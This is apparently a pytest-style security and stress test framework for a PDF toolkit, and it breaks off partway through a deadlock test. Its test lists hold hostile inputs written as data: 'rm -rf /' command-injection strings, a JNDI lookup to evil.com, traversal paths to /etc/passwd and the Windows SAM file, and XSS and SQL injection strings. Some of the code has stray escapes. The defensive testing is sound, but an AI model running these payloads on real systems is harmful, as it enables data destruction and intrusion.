"""Comprehensive Security and Stress Testing Framework.

This module provides a unified framework for running comprehensive security
and stress tests across all components of Smart PDF Toolkit.
"""

import pytest
import time
import threading
import psutil
import os
import gc
import resource
import hashlib
import random
import string
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Tuple, Union
from dataclasses import dataclass, field
from unittest.mock import patch, MagicMock
import logging

from smart_pdf_toolkit.core.interfaces import OperationResult
from smart_pdf_toolkit.core.config import Config
from smart_pdf_toolkit.core.security_manager import SecurityManager
from smart_pdf_toolkit.core.pdf_operations import PDFOperationsManager
from smart_pdf_toolkit.core.format_converter import FormatConverter
from smart_pdf_toolkit.core.content_extractor import ContentExtractor

logger = logging.getLogger(__name__)


@dataclass
class SecurityTestResult:
    \"\"\"Result of a security test.\"\"\"
    test_name: str
    passed: bool
    execution_time: float
    memory_usage: int
    error_message: Optional[str] = None
    details: Optional[Dict[str, Any]] = None
    severity: str = \"medium\"
    category: str = \"general\"


@dataclass
class StressTestMetrics:
    \"\"\"Metrics collected during stress testing.\"\"\"
    peak_memory_mb: float
    avg_memory_mb: float
    peak_cpu_percent: float
    avg_cpu_percent: float
    total_execution_time: float
    operations_per_second: float
    error_count: int
    success_count: int
    concurrent_operations: int = 1
    test_duration: float = 0.0


@dataclass
class SecurityTestSuite:
    \"\"\"Configuration for a security test suite.\"\"\"
    name: str
    tests: List[str] = field(default_factory=list)
    severity: str = \"medium\"
    timeout: int = 300  # 5 minutes default
    max_memory_mb: int = 1024  # 1GB default
    enabled: bool = True


class SecurityTestOrchestrator:
    \"\"\"Orchestrates comprehensive security and stress testing.\"\"\"
    
    def __init__(self, config: Config):
        self.config = config
        self.security_manager = SecurityManager(config)
        self.pdf_operations = PDFOperationsManager(config)
        self.format_converter = FormatConverter(config)
        self.content_extractor = ContentExtractor(config)
        
        self.test_results: List[SecurityTestResult] = []
        self.stress_metrics: List[StressTestMetrics] = []
        
        # Test suites configuration
        self.test_suites = {
            \"password_security\": SecurityTestSuite(
                name=\"Password Security Tests\",
                tests=[\"test_password_strength\", \"test_password_bypass\", \"test_brute_force_protection\"],
                severity=\"high\",
                timeout=600
            ),
            \"input_validation\": SecurityTestSuite(
                name=\"Input Validation Tests\",
                tests=[\"test_malicious_inputs\", \"test_buffer_overflow\", \"test_injection_attacks\"],
                severity=\"critical\",
                timeout=300
            ),
            \"file_handling\": SecurityTestSuite(
                name=\"File Handling Security Tests\",
                tests=[\"test_malicious_pdfs\", \"test_file_traversal\", \"test_zip_bombs\"],
                severity=\"high\",
                timeout=900
            ),
            \"memory_stress\": SecurityTestSuite(
                name=\"Memory Stress Tests\",
                tests=[\"test_memory_exhaustion\", \"test_memory_leaks\", \"test_large_file_handling\"],
                severity=\"medium\",
                timeout=1200,
                max_memory_mb=2048
            ),
            \"concurrent_stress\": SecurityTestSuite(
                name=\"Concurrent Operations Stress Tests\",
                tests=[\"test_concurrent_operations\", \"test_race_conditions\", \"test_deadlock_prevention\"],
                severity=\"medium\",
                timeout=600
            )
        }
    
    def run_comprehensive_tests(self, suites: Optional[List[str]] = None) -> Dict[str, Any]:
        \"\"\"Run comprehensive security and stress tests.
        
        Args:
            suites: List of test suite names to run. If None, runs all enabled suites.
            
        Returns:
            Dictionary containing test results and metrics
        \"\"\"
        if suites is None:
            suites = [name for name, suite in self.test_suites.items() if suite.enabled]
        
        logger.info(f\"Starting comprehensive security tests for suites: {suites}\")
        
        overall_start_time = time.time()
        suite_results = {}
        
        for suite_name in suites:
            if suite_name not in self.test_suites:
                logger.warning(f\"Unknown test suite: {suite_name}\")
                continue
                
            suite = self.test_suites[suite_name]
            logger.info(f\"Running test suite: {suite.name}\")
            
            suite_start_time = time.time()
            suite_results[suite_name] = self._run_test_suite(suite)
            suite_execution_time = time.time() - suite_start_time
            
            logger.info(f\"Completed test suite {suite.name} in {suite_execution_time:.2f}s\")
        
        overall_execution_time = time.time() - overall_start_time
        
        # Generate comprehensive report
        report = self._generate_comprehensive_report(suite_results, overall_execution_time)
        
        logger.info(f\"Comprehensive security testing completed in {overall_execution_time:.2f}s\")
        return report
    
    def _run_test_suite(self, suite: SecurityTestSuite) -> Dict[str, Any]:
        \"\"\"Run a specific test suite.\"\"\"
        suite_results = {
            \"name\": suite.name,
            \"severity\": suite.severity,
            \"tests\": [],
            \"passed\": 0,
            \"failed\": 0,
            \"errors\": [],
            \"execution_time\": 0.0,
            \"memory_usage\": {}
        }
        
        start_time = time.time()
        initial_memory = psutil.Process().memory_info().rss / 1024 / 1024
        
        for test_name in suite.tests:
            try:
                test_method = getattr(self, test_name, None)
                if test_method is None:
                    logger.warning(f\"Test method {test_name} not found\")\n                    continue
                
                logger.info(f\"Running test: {test_name}\")
                test_result = self._run_single_test(test_method, test_name, suite.timeout, suite.max_memory_mb)
                
                suite_results[\"tests\"].append(test_result)
                if test_result.passed:
                    suite_results[\"passed\"] += 1
                else:
                    suite_results[\"failed\"] += 1
                    suite_results[\"errors\"].append(test_result.error_message)
                
            except Exception as e:
                logger.error(f\"Error running test {test_name}: {e}\")\n                suite_results[\"failed\"] += 1
                suite_results[\"errors\"].append(str(e))
        
        suite_results[\"execution_time\"] = time.time() - start_time
        final_memory = psutil.Process().memory_info().rss / 1024 / 1024
        suite_results[\"memory_usage\"] = {
            \"initial_mb\": initial_memory,
            \"final_mb\": final_memory,
            \"delta_mb\": final_memory - initial_memory
        }
        
        return suite_results
    
    def _run_single_test(self, test_method, test_name: str, timeout: int, max_memory_mb: int) -> SecurityTestResult:
        \"\"\"Run a single security test with monitoring.\"\"\"
        start_time = time.time()
        initial_memory = psutil.Process().memory_info().rss / 1024 / 1024
        
        try:
            # Run test with timeout
            result = self._run_with_timeout(test_method, timeout)
            
            execution_time = time.time() - start_time
            final_memory = psutil.Process().memory_info().rss / 1024 / 1024
            memory_used = final_memory - initial_memory
            
            # Check memory usage
            if memory_used > max_memory_mb:
                return SecurityTestResult(
                    test_name=test_name,
                    passed=False,
                    execution_time=execution_time,
                    memory_usage=int(memory_used),
                    error_message=f\"Memory usage exceeded limit: {memory_used:.2f}MB > {max_memory_mb}MB\",
                    severity=\"high\",
                    category=\"memory\"
                )
            
            return SecurityTestResult(
                test_name=test_name,
                passed=result.get(\"passed\", True),
                execution_time=execution_time,
                memory_usage=int(memory_used),
                error_message=result.get(\"error\"),
                details=result.get(\"details\"),
                severity=result.get(\"severity\", \"medium\"),
                category=result.get(\"category\", \"general\")
            )
            
        except TimeoutError:
            return SecurityTestResult(
                test_name=test_name,
                passed=False,
                execution_time=timeout,
                memory_usage=0,
                error_message=f\"Test timed out after {timeout} seconds\",
                severity=\"high\",
                category=\"timeout\"
            )
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                passed=False,
                execution_time=time.time() - start_time,
                memory_usage=0,
                error_message=str(e),
                severity=\"high\",
                category=\"error\"
            )
    
    def _run_with_timeout(self, func, timeout: int) -> Dict[str, Any]:
        \"\"\"Run a function with timeout.\"\"\"
        result = {}
        exception = None
        
        def target():
            nonlocal result, exception
            try:
                result = func()
            except Exception as e:
                exception = e
        
        thread = threading.Thread(target=target)
        thread.daemon = True
        thread.start()
        thread.join(timeout)
        
        if thread.is_alive():
            raise TimeoutError(f\"Function timed out after {timeout} seconds\")
        
        if exception:
            raise exception
            
        return result or {\"passed\": True}
    
    def _generate_comprehensive_report(self, suite_results: Dict[str, Any], total_time: float) -> Dict[str, Any]:
        \"\"\"Generate a comprehensive test report.\"\"\"
        total_tests = sum(len(suite[\"tests\"]) for suite in suite_results.values())
        total_passed = sum(suite[\"passed\"] for suite in suite_results.values())
        total_failed = sum(suite[\"failed\"] for suite in suite_results.values())
        
        # Categorize failures by severity
        critical_failures = []
        high_failures = []
        medium_failures = []
        
        for suite_name, suite in suite_results.items():
            for test in suite[\"tests\"]:
                if not test.passed:
                    if test.severity == \"critical\":
                        critical_failures.append(test)
                    elif test.severity == \"high\":
                        high_failures.append(test)
                    else:
                        medium_failures.append(test)
        
        return {
            \"summary\": {
                \"total_tests\": total_tests,
                \"passed\": total_passed,
                \"failed\": total_failed,
                \"success_rate\": (total_passed / total_tests * 100) if total_tests > 0 else 0,
                \"total_execution_time\": total_time
            },
            \"failures_by_severity\": {
                \"critical\": len(critical_failures),
                \"high\": len(high_failures),
                \"medium\": len(medium_failures)
            },
            \"suite_results\": suite_results,
            \"critical_failures\": [self._test_result_to_dict(t) for t in critical_failures],
            \"high_failures\": [self._test_result_to_dict(t) for t in high_failures],
            \"recommendations\": self._generate_recommendations(suite_results),
            \"timestamp\": time.time()
        }
    
    def _test_result_to_dict(self, test_result: SecurityTestResult) -> Dict[str, Any]:
        \"\"\"Convert SecurityTestResult to dictionary.\"\"\"
        return {
            \"test_name\": test_result.test_name,
            \"passed\": test_result.passed,
            \"execution_time\": test_result.execution_time,
            \"memory_usage\": test_result.memory_usage,
            \"error_message\": test_result.error_message,
            \"severity\": test_result.severity,
            \"category\": test_result.category,
            \"details\": test_result.details
        }
    
    def _generate_recommendations(self, suite_results: Dict[str, Any]) -> List[str]:
        \"\"\"Generate security recommendations based on test results.\"\"\"
        recommendations = []
        
        # Check for critical failures
        critical_count = sum(1 for suite in suite_results.values() 
                           for test in suite[\"tests\"] 
                           if not test.passed and test.severity == \"critical\")
        
        if critical_count > 0:
            recommendations.append(f\"URGENT: {critical_count} critical security issues found. Immediate attention required.\")
        
        # Check memory usage patterns
        high_memory_tests = [test for suite in suite_results.values() 
                           for test in suite[\"tests\"] 
                           if test.memory_usage > 500]  # 500MB threshold
        
        if high_memory_tests:
            recommendations.append(f\"Consider optimizing memory usage for {len(high_memory_tests)} tests with high memory consumption.\")
        
        # Check timeout issues
        timeout_tests = [test for suite in suite_results.values() 
                        for test in suite[\"tests\"] 
                        if test.category == \"timeout\"]
        
        if timeout_tests:
            recommendations.append(f\"Performance optimization needed for {len(timeout_tests)} tests that timed out.\")
        
        return recommendations
"    
# Security Test Methods
    
    def test_password_strength(self) -> Dict[str, Any]:
        \"\"\"Test password strength validation and enforcement.\"\"\"
        weak_passwords = [\"\", \"123\", \"password\", \"abc\", \"1234567890\"]
        strong_passwords = [\"StrongP@ssw0rd123!\", \"C0mpl3x_P@ssw0rd!\", \"S3cur3_K3y_2024!\"]
        
        results = {\"passed\": True, \"details\": {}, \"severity\": \"high\", \"category\": \"authentication\"}
        
        # Test weak password rejection
        for weak_pwd in weak_passwords:
            try:
                # This should fail or warn for weak passwords
                temp_pdf = self.config.temp_dir / \"test_weak_pwd.pdf\"
                temp_pdf.touch()
                
                result = self.security_manager.add_password(
                    pdf_path=str(temp_pdf),
                    password=weak_pwd,
                    output_path=str(temp_pdf.with_suffix(\".protected.pdf\"))
                )
                
                # If weak password is accepted without warning, that's a security issue
                if result.success and \"weak\" not in result.message.lower():
                    results[\"passed\"] = False
                    results[\"details\"][f\"weak_password_{weak_pwd}\"] = \"Weak password accepted without warning\"
                    
            except Exception as e:
                logger.debug(f\"Expected error for weak password {weak_pwd}: {e}\")
        
        # Test strong password acceptance
        for strong_pwd in strong_passwords:
            try:
                temp_pdf = self.config.temp_dir / \"test_strong_pwd.pdf\"
                temp_pdf.touch()
                
                result = self.security_manager.add_password(
                    pdf_path=str(temp_pdf),
                    password=strong_pwd,
                    output_path=str(temp_pdf.with_suffix(\".protected.pdf\"))
                )
                
                if not result.success:
                    results[\"details\"][f\"strong_password_{len(strong_pwd)}\"] = f\"Strong password rejected: {result.message}\"
                    
            except Exception as e:
                results[\"details\"][f\"strong_password_error\"] = str(e)
        
        return results
    
    def test_password_bypass(self) -> Dict[str, Any]:
        \"\"\"Test for password bypass vulnerabilities.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"critical\", \"category\": \"authentication\"}
        
        try:
            # Create a password-protected PDF
            temp_pdf = self.config.temp_dir / \"test_bypass.pdf\"
            temp_pdf.touch()
            protected_pdf = self.config.temp_dir / \"test_bypass_protected.pdf\"
            
            password = \"TestPassword123!\"\n            result = self.security_manager.add_password(\n                pdf_path=str(temp_pdf),\n                password=password,\n                output_path=str(protected_pdf)\n            )\n            \n            if result.success:\n                # Try to access without password\n                try:\n                    bypass_result = self.pdf_operations.split_pdf(\n                        pdf_path=str(protected_pdf),\n                        output_dir=str(self.config.temp_dir / \"bypass_test\")\n                    )\n                    \n                    if bypass_result.success:\n                        results[\"passed\"] = False\n                        results[\"details\"][\"bypass_detected\"] = \"Password protection bypassed during split operation\"\n                        \n                except Exception as e:\n                    # Expected - operation should fail without password\n                    results[\"details\"][\"protection_working\"] = \"Password protection prevented unauthorized access\"\n                    \n        except Exception as e:\n            results[\"details\"][\"test_error\"] = str(e)\n            \n        return results\n    \n    def test_brute_force_protection(self) -> Dict[str, Any]:\n        \"\"\"Test protection against brute force attacks.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"high\", \"category\": \"authentication\"}
        
        try:
            # Create a password-protected PDF
            temp_pdf = self.config.temp_dir / \"test_brute_force.pdf\"
            temp_pdf.touch()
            protected_pdf = self.config.temp_dir / \"test_brute_force_protected.pdf\"
            
            correct_password = \"CorrectPassword123!\"
            result = self.security_manager.add_password(
                pdf_path=str(temp_pdf),
                password=correct_password,
                output_path=str(protected_pdf)
            )
            
            if result.success:
                # Simulate brute force attempts
                wrong_passwords = [\"wrong1\", \"wrong2\", \"wrong3\", \"123456\", \"password\"]
                attempt_times = []
                
                for wrong_pwd in wrong_passwords:
                    start_time = time.time()
                    try:
                        self.security_manager.remove_password(
                            pdf_path=str(protected_pdf),
                            password=wrong_pwd,
                            output_path=str(self.config.temp_dir / \"temp_unlock.pdf\")
                        )
                    except Exception:
                        pass  # Expected to fail
                    
                    attempt_time = time.time() - start_time
                    attempt_times.append(attempt_time)
                
                # Check if there's any rate limiting or delay
                avg_attempt_time = sum(attempt_times) / len(attempt_times)
                results[\"details\"][\"avg_attempt_time\"] = avg_attempt_time
                
                if avg_attempt_time < 0.1:  # Less than 100ms per attempt
                    results[\"details\"][\"warning\"] = \"No apparent rate limiting for password attempts\"
                    
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_malicious_inputs(self) -> Dict[str, Any]:
        \"\"\"Test handling of malicious inputs.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"critical\", \"category\": \"input_validation\"}
        
        malicious_inputs = [
            \"../../../etc/passwd\",  # Path traversal
            \"\\x00\\x01\\x02\\x03\",  # Null bytes and control characters
            \"A\" * 10000,  # Buffer overflow attempt
            \"<script>alert('xss')</script>\",  # XSS attempt
            \"'; DROP TABLE users; --\",  # SQL injection attempt
            \"${jndi:ldap://evil.com/a}\",  # Log4j style injection
            \"\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe\",  # Windows path traversal
        ]
        
        for malicious_input in malicious_inputs:
            try:
                # Test with PDF operations
                result = self.pdf_operations.split_pdf(
                    pdf_path=malicious_input,
                    output_dir=str(self.config.temp_dir)
                )
                
                # Should fail gracefully, not crash
                if \"error\" not in result.message.lower() and \"invalid\" not in result.message.lower():
                    results[\"details\"][f\"input_{malicious_input[:20]}\"] = \"Malicious input not properly rejected\"
                    
            except Exception as e:
                # Expected - should handle malicious input gracefully
                results[\"details\"][f\"handled_{malicious_input[:20]}\"] = \"Properly handled malicious input\"
        
        return results
    
    def test_buffer_overflow(self) -> Dict[str, Any]:
        \"\"\"Test for buffer overflow vulnerabilities.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"critical\", \"category\": \"memory_safety\"}
        
        try:
            # Create extremely long strings
            long_strings = [
                \"A\" * 1000,
                \"B\" * 10000,
                \"C\" * 100000,
                \"\\x41\" * 50000,  # Hex representation
            ]
            
            for long_string in long_strings:
                try:
                    # Test with various operations
                    temp_pdf = self.config.temp_dir / \"buffer_test.pdf\"
                    temp_pdf.touch()
                    
                    # Test with password (long password)
                    result = self.security_manager.add_password(
                        pdf_path=str(temp_pdf),
                        password=long_string,
                        output_path=str(temp_pdf.with_suffix(\".protected.pdf\"))
                    )
                    
                    # Should handle gracefully
                    if result.success and len(long_string) > 1000:
                        results[\"details\"][f\"long_password_{len(long_string)}\"] = \"Extremely long password accepted\"
                        
                except Exception as e:
                    # Expected for very long inputs
                    results[\"details\"][f\"handled_long_input_{len(long_string)}\"] = \"Properly handled long input\"
                    
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_injection_attacks(self) -> Dict[str, Any]:
        \"\"\"Test for various injection attack vulnerabilities.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"critical\", \"category\": \"injection\"}
        
        injection_payloads = [
            \"'; rm -rf / --no-preserve-root; echo '\",  # Command injection
            \"$(rm -rf /)\",  # Command substitution
            \"`rm -rf /`\",  # Backtick command execution
            \"{{7*7}}\",  # Template injection
            \"${7*7}\",  # Expression language injection
            \"#{7*7}\",  # SpEL injection
        ]
        
        for payload in injection_payloads:
            try:
                # Test with file operations
                result = self.content_extractor.extract_text(
                    pdf_path=payload,
                    output_path=str(self.config.temp_dir / \"injection_test.txt\")
                )
                
                # Should fail safely
                if result.success:
                    results[\"passed\"] = False
                    results[\"details\"][f\"injection_{payload[:20]}\"] = \"Injection payload not properly sanitized\"
                    
            except Exception as e:
                # Expected - should handle injection attempts gracefully
                results[\"details\"][f\"handled_injection\"] = \"Properly handled injection attempt\"
        
        return results
    
    def test_malicious_pdfs(self) -> Dict[str, Any]:
        \"\"\"Test handling of malicious PDF files.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"high\", \"category\": \"file_security\"}
        
        try:
            # Create various malicious PDF scenarios
            malicious_scenarios = [
                self._create_oversized_pdf(),
                self._create_deeply_nested_pdf(),
                self._create_recursive_pdf(),
                self._create_javascript_pdf(),
            ]
            
            for i, malicious_pdf in enumerate(malicious_scenarios):
                if malicious_pdf:
                    try:
                        # Test various operations on malicious PDF
                        operations = [
                            lambda: self.pdf_operations.split_pdf(str(malicious_pdf), str(self.config.temp_dir)),
                            lambda: self.content_extractor.extract_text(str(malicious_pdf), str(self.config.temp_dir / \"text.txt\")),
                            lambda: self.format_converter.pdf_to_images(str(malicious_pdf), \"PNG\", 90, str(self.config.temp_dir)),
                        ]
                        
                        for j, operation in enumerate(operations):
                            try:
                                result = operation()
                                # Should handle malicious PDFs gracefully
                                if result.success:
                                    results[\"details\"][f\"malicious_pdf_{i}_op_{j}\"] = \"Malicious PDF processed without proper validation\"
                            except Exception as e:
                                # Expected - should reject malicious PDFs
                                results[\"details\"][f\"rejected_malicious_{i}_{j}\"] = \"Properly rejected malicious PDF\"
                                
                    except Exception as e:
                        results[\"details\"][f\"malicious_pdf_error_{i}\"] = str(e)
                        
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_file_traversal(self) -> Dict[str, Any]:
        \"\"\"Test for file traversal vulnerabilities.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"high\", \"category\": \"file_security\"}
        
        traversal_paths = [
            \"../../../etc/passwd\",
            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",
            \"....//....//....//etc//passwd\",
            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",  # URL encoded
            \"..%252f..%252f..%252fetc%252fpasswd\",  # Double URL encoded
        ]
        
        for path in traversal_paths:
            try:
                # Test with output path
                result = self.pdf_operations.rotate_pdf(
                    pdf_path=str(self.config.temp_dir / \"test.pdf\"),
                    angles=[90],
                    output_path=path
                )
                
                # Should reject traversal attempts
                if result.success:
                    results[\"passed\"] = False
                    results[\"details\"][f\"traversal_{path[:20]}\"] = \"File traversal not prevented\"
                    
            except Exception as e:
                # Expected - should prevent traversal
                results[\"details\"][f\"prevented_traversal\"] = \"Properly prevented file traversal\"
        
        return results
    
    def test_zip_bombs(self) -> Dict[str, Any]:
        \"\"\"Test handling of zip bomb-like attacks.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"medium\", \"category\": \"dos_protection\"}
        
        try:
            # Create a PDF with excessive compression ratio (simulated zip bomb)
            zip_bomb_pdf = self._create_zip_bomb_pdf()
            
            if zip_bomb_pdf:
                start_time = time.time()
                initial_memory = psutil.Process().memory_info().rss / 1024 / 1024
                
                try:
                    result = self.content_extractor.extract_text(
                        pdf_path=str(zip_bomb_pdf),
                        output_path=str(self.config.temp_dir / \"zip_bomb_text.txt\")
                    )
                    
                    execution_time = time.time() - start_time
                    final_memory = psutil.Process().memory_info().rss / 1024 / 1024
                    memory_used = final_memory - initial_memory
                    
                    # Check for excessive resource usage
                    if execution_time > 30:  # 30 seconds
                        results[\"details\"][\"excessive_time\"] = f\"Operation took {execution_time:.2f} seconds\"
                    
                    if memory_used > 500:  # 500MB
                        results[\"details\"][\"excessive_memory\"] = f\"Operation used {memory_used:.2f}MB\"
                        
                except Exception as e:
                    # Expected - should handle zip bombs gracefully
                    results[\"details\"][\"zip_bomb_handled\"] = \"Properly handled potential zip bomb\"
                    
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_memory_exhaustion(self) -> Dict[str, Any]:
        \"\"\"Test memory exhaustion scenarios.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"medium\", \"category\": \"memory_safety\"}
        
        try:
            # Monitor memory usage during operations
            initial_memory = psutil.Process().memory_info().rss / 1024 / 1024
            
            # Create multiple large operations
            large_operations = []
            for i in range(10):
                temp_pdf = self.config.temp_dir / f\"large_test_{i}.pdf\"
                temp_pdf.touch()
                large_operations.append(temp_pdf)
            
            # Process all files simultaneously
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                for pdf_path in large_operations:
                    future = executor.submit(
                        self.pdf_operations.split_pdf,
                        str(pdf_path),
                        str(self.config.temp_dir / f\"split_{pdf_path.stem}\")
                    )
                    futures.append(future)
                
                # Wait for completion and monitor memory
                peak_memory = initial_memory
                for future in as_completed(futures, timeout=60):
                    current_memory = psutil.Process().memory_info().rss / 1024 / 1024
                    peak_memory = max(peak_memory, current_memory)
                    
                    try:
                        result = future.result()
                    except Exception as e:
                        results[\"details\"][\"operation_error\"] = str(e)
            
            memory_increase = peak_memory - initial_memory
            results[\"details\"][\"memory_increase_mb\"] = memory_increase
            
            if memory_increase > 1000:  # 1GB increase
                results[\"details\"][\"high_memory_usage\"] = f\"Memory increased by {memory_increase:.2f}MB\"
                
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_memory_leaks(self) -> Dict[str, Any]:
        \"\"\"Test for memory leaks.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"medium\", \"category\": \"memory_safety\"}
        
        try:
            # Perform repeated operations and monitor memory
            initial_memory = psutil.Process().memory_info().rss / 1024 / 1024
            memory_samples = [initial_memory]
            
            temp_pdf = self.config.temp_dir / \"leak_test.pdf\"
            temp_pdf.touch()
            
            # Perform 50 operations
            for i in range(50):
                try:
                    result = self.pdf_operations.rotate_pdf(
                        pdf_path=str(temp_pdf),
                        angles=[90],
                        output_path=str(self.config.temp_dir / f\"rotated_{i}.pdf\")
                    )
                    
                    # Sample memory every 10 operations
                    if i % 10 == 0:
                        current_memory = psutil.Process().memory_info().rss / 1024 / 1024
                        memory_samples.append(current_memory)
                        
                        # Force garbage collection
                        gc.collect()
                        
                except Exception as e:
                    results[\"details\"][f\"operation_error_{i}\"] = str(e)
            
            # Analyze memory trend
            if len(memory_samples) > 2:
                memory_trend = memory_samples[-1] - memory_samples[0]
                results[\"details\"][\"memory_trend_mb\"] = memory_trend
                results[\"details\"][\"memory_samples\"] = memory_samples
                
                if memory_trend > 100:  # 100MB increase over time
                    results[\"details\"][\"potential_leak\"] = f\"Memory increased by {memory_trend:.2f}MB over {len(memory_samples)} samples\"
                    
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_large_file_handling(self) -> Dict[str, Any]:
        \"\"\"Test handling of large files.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"medium\", \"category\": \"scalability\"}
        
        try:
            # Create a large dummy file
            large_file = self.config.temp_dir / \"large_test.pdf\"
            
            # Create a file that's larger than typical memory
            with open(large_file, \"wb\") as f:
                # Write 100MB of data
                chunk_size = 1024 * 1024  # 1MB chunks
                for i in range(100):
                    f.write(b\"A\" * chunk_size)
            
            start_time = time.time()
            initial_memory = psutil.Process().memory_info().rss / 1024 / 1024
            
            try:
                # Try to process the large file
                result = self.pdf_operations.split_pdf(
                    pdf_path=str(large_file),
                    output_dir=str(self.config.temp_dir / \"large_split\")
                )
                
                execution_time = time.time() - start_time
                final_memory = psutil.Process().memory_info().rss / 1024 / 1024
                memory_used = final_memory - initial_memory
                
                results[\"details\"][\"execution_time\"] = execution_time
                results[\"details\"][\"memory_used_mb\"] = memory_used
                results[\"details\"][\"file_size_mb\"] = large_file.stat().st_size / 1024 / 1024
                
                # Check if operation completed reasonably
                if execution_time > 300:  # 5 minutes
                    results[\"details\"][\"slow_processing\"] = f\"Large file took {execution_time:.2f} seconds\"
                
                if memory_used > 500:  # 500MB
                    results[\"details\"][\"high_memory\"] = f\"Large file used {memory_used:.2f}MB memory\"
                    
            except Exception as e:
                # May fail due to invalid PDF format, which is expected
                results[\"details\"][\"large_file_error\"] = str(e)
                
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_concurrent_operations(self) -> Dict[str, Any]:
        \"\"\"Test concurrent operations for race conditions.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"medium\", \"category\": \"concurrency\"}
        
        try:
            # Create test files
            test_files = []
            for i in range(10):
                test_file = self.config.temp_dir / f\"concurrent_test_{i}.pdf\"
                test_file.touch()
                test_files.append(test_file)
            
            # Run concurrent operations
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                
                for i, test_file in enumerate(test_files):
                    # Mix different operations
                    if i % 3 == 0:
                        future = executor.submit(
                            self.pdf_operations.rotate_pdf,
                            str(test_file),
                            [90],
                            str(self.config.temp_dir / f\"rotated_{i}.pdf\")
                        )
                    elif i % 3 == 1:
                        future = executor.submit(
                            self.content_extractor.extract_text,
                            str(test_file),
                            str(self.config.temp_dir / f\"text_{i}.txt\")
                        )
                    else:
                        future = executor.submit(
                            self.pdf_operations.split_pdf,
                            str(test_file),
                            str(self.config.temp_dir / f\"split_{i}\")
                        )
                    
                    futures.append((i, future))
                
                # Collect results
                completed = 0
                errors = 0
                for i, future in futures:
                    try:
                        result = future.result(timeout=30)
                        completed += 1
                    except Exception as e:
                        errors += 1
                        results[\"details\"][f\"concurrent_error_{i}\"] = str(e)
            
            execution_time = time.time() - start_time
            results[\"details\"][\"concurrent_operations\"] = len(test_files)
            results[\"details\"][\"completed\"] = completed
            results[\"details\"][\"errors\"] = errors
            results[\"details\"][\"execution_time\"] = execution_time
            
            if errors > completed / 2:  # More than 50% errors
                results[\"passed\"] = False
                results[\"details\"][\"high_error_rate\"] = f\"{errors}/{len(test_files)} operations failed\"
                
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_race_conditions(self) -> Dict[str, Any]:
        \"\"\"Test for race conditions in file operations.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"medium\", \"category\": \"concurrency\"}
        
        try:
            # Create a shared resource
            shared_file = self.config.temp_dir / \"shared_resource.pdf\"
            shared_file.touch()
            
            # Create multiple threads that access the same file
            def concurrent_operation(thread_id):
                try:
                    # Each thread tries to modify the same file
                    result = self.pdf_operations.rotate_pdf(
                        pdf_path=str(shared_file),
                        angles=[90 * thread_id],
                        output_path=str(self.config.temp_dir / f\"race_output_{thread_id}.pdf\")
                    )
                    return {\"thread_id\": thread_id, \"success\": result.success, \"message\": result.message}
                except Exception as e:
                    return {\"thread_id\": thread_id, \"success\": False, \"error\": str(e)}
            
            # Run concurrent operations
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(concurrent_operation, i) for i in range(5)]
                
                thread_results = []
                for future in as_completed(futures, timeout=60):
                    thread_result = future.result()
                    thread_results.append(thread_result)
            
            # Analyze results for race conditions
            successful_operations = [r for r in thread_results if r[\"success\"]]
            failed_operations = [r for r in thread_results if not r[\"success\"]]
            
            results[\"details\"][\"successful_operations\"] = len(successful_operations)
            results[\"details\"][\"failed_operations\"] = len(failed_operations)
            results[\"details\"][\"thread_results\"] = thread_results
            
            # Check for inconsistent results (potential race condition)
            if len(successful_operations) > 0 and len(failed_operations) > 0:
                results[\"details\"][\"inconsistent_results\"] = \"Some operations succeeded while others failed - potential race condition\"
                
        except Exception as e:
            results[\"details\"][\"test_error\"] = str(e)
            
        return results
    
    def test_deadlock_prevention(self) -> Dict[str, Any]:
        \"\"\"Test deadlock prevention mechanisms.\"\"\"
        results = {\"passed\": True, \"details\": {}, \"severity\": \"medium\", \"category\": \"concurrency\"}
        
        try:
            # Create two files for cross-dependency test
            file_a = self.config.temp_dir / \"deadlock_a.pdf\"
            file_b = self.config.temp_dir / \"deadlock_b.pdf\"
            file_a.touch()
            file_b.touch()
            
            def operation_a_to_b():
                \"\"\"Operation that processes file A and outputs to file B location.\"\"\"
                try:
                    time.sleep(0.1)  # Simulate processing time
                    result = self.pdf_operations.rotate_pdf(
                        pdf_path=str(file_a),
                        angles=[90],
                        output_path=str(self.config.temp_dir / \"a_to_b.pdf\")
                    )
                    return {\"operation\": \"a_to_b\", \"success\": result.success}
                except Exception as e:
                    return {\"operation\": \"a_to_b\", \"success\": False, \"error\": str(e)}
            
            def operation_b_to_a():
                \"\"\"Operation that processes file B and outputs to file A location.\"\"\"
                try:
                    time.sleep(0.1)  # Simulate processing time
